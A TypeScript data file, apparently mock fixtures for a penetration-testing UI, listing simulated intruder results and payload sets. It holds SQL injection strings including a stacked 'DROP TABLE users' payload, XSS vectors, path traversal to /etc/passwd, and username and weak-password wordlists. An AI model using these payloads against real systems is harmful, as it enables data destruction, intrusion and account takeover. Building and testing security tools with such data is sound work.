import type { IntruderResult } from "@/lib/types";

export const intruderResults: IntruderResult[] = [
  { request: 1, payload: "1' OR '1'='1", position: "§id§", status: 500, length: 12704, time: "892 ms", comment: "SQLite syntax error" },
  { request: 2, payload: "1' OR '1'='1' --", position: "§id§", status: 500, length: 12704, time: "910 ms", comment: "" },
  { request: 3, payload: "1 AND 1=1", position: "§id§", status: 200, length: 4301, time: "214 ms", comment: "baseline +" },
  { request: 4, payload: "1 AND 1=2", position: "§id§", status: 200, length: 1326, time: "226 ms", comment: "baseline −" },
  { request: 5, payload: "1' UNION SELECT 1,2,3--", position: "§id§", status: 500, length: 12704, time: "905 ms", comment: "column count?" },
  { request: 6, payload: "1' AND SLEEP(3)--", position: "§id§", status: 200, length: 4301, time: "3152 ms", comment: "time-based +3s" },
  { request: 7, payload: "1 ORDER BY 5--", position: "§id§", status: 500, length: 12704, time: "884 ms", comment: "" },
  { request: 8, payload: "1); DROP TABLE users--", position: "§id§", status: 500, length: 12704, time: "901 ms", comment: "stacked statements accepted" },
];

export const payloadSets = [
  { id: "sqli", name: "SQLi — boolean", entries: ["1 AND 1=1", "1 AND 1=2", "1' AND '1'='1", "1' AND '1'='2"] },
  { id: "xss", name: "XSS — vector pack", entries: ["<script>alert(1)</script>", "javascript:alert(1)", "<img src=x onerror=alert(1)>"] },
  { id: "path", name: "Path traversal", entries: ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd"] },
  { id: "usernames", name: "Usernames", entries: ["admin", "root", "user", "alex", "guest", "operator"] },
  { id: "passwords", name: "Passwords", entries: ["hunter2", "password", "admin123", "letmein", "123456"] },
] as const;